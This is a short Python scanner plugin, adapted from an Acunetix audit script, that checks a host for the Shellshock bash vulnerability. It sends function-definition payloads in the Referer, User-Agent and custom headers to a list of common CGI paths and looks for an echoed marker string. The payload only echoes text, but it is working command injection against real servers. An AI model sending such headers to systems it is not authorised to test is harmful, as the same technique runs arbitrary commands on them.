#!/usr/bin/env python
# coding=utf-8

import urlparse
import requests


def verify(ip, port=80, name='', timeout=10, types='ip'):
    '''
    payload from awvs decode script: Bash_RCE_Server_Audit.script
    '''
    variants = [
            "/",
            "/administrator.cgi",
            "/admin.cgi",
            "/cgi-bin/admin.cgi",
            "/cgi-bin/FormHandler.cgi",
            "/cgi-bin/FormMail.cgi",
            "/cgi-bin/guestbook.cgi",
            "/cgi-bin/search.cgi",
            "/cgi-sys/addalink.cgi",
            "/cgi-sys/entropybanner.cgi",
            "/cgi-sys/entropysearch.cgi",   
            "/cgi-sys/defaultwebpage.cgi",
            "/cgi-sys/FormMail-clone.cgi",
            "/cgi-sys/domainredirect.cgi",
            "/cgi-bin-sdb/printenv",    
            "/cgi-mod/index.cgi",
            "/cgi-bin/test.cgi",
            "/cgi-bin-sdb/printenv"
                ];

    if types == 'ip':
        url = "{}:{}".format(ip, port)
    else:
        url = ip

    if not url.startswith("http:") or not url.startswith("https:"):
        url = 'http://' + url
    
    parsed_url = urlparse.urlparse(url)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc

    info = {
        'url': '',
        'severity': 'high',
        'vuln_name': 'shellshock',
        'proof': 'Referer/UA/shellsock/ in headers'
    }

    headers = {}
    headers['Referer'] = '() { ' + 'Referer' + '; }; echo -e "Content-Type: text/plain\\n"; echo -e "\\0141\\0143\\0165\\0156\\0145\\0164\\0151\\0170\\0163\\0150\\0145\\0154\\0154\\0163\\0150\\0157\\0143\\0153"'
    headers['User-Agent'] = '() { ' + 'User-Agent' + '; }; echo -e "Content-Type: text/plain\\n"; echo -e "\\0141\\0143\\0165\\0156\\0145\\0164\\0151\\0170\\0163\\0150\\0145\\0154\\0154\\0163\\0150\\0157\\0143\\0153"'
    headers['shellshock'] = '() { (a)=>\' echo -e "Content-Type: text/plain\\n"; echo -e "\\0141\\0143\\0165\\0156\\0145\\0164\\0151\\0170\\0163\\0150\\0145\\0154\\0154\\0163\\0150\\0157\\0143\\0153"'
    
    for var in variants:
        aimed_url = base_url + var
        try:
            resp = requests.get(aimed_url, headers=headers, allow_redirects=False, verify=False)
            html = resp.text
            if 'acunetixshellshock' in html:
                info['url'] = aimed_url
                return info
        except Exception as e:
            pass

    return False